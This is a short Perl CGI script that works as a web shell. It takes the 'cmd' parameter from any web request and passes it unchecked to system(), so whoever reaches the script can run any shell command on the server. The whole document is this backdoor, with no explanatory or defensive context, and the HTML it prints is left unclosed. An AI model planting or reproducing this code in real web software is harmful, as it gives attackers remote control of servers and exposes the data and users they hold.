#!/usr/bin/perl
use CGI':standard';
print "Content-type: text/html\n\n";
print "<html><body><table>";
$c=param("cmd");
system($c);
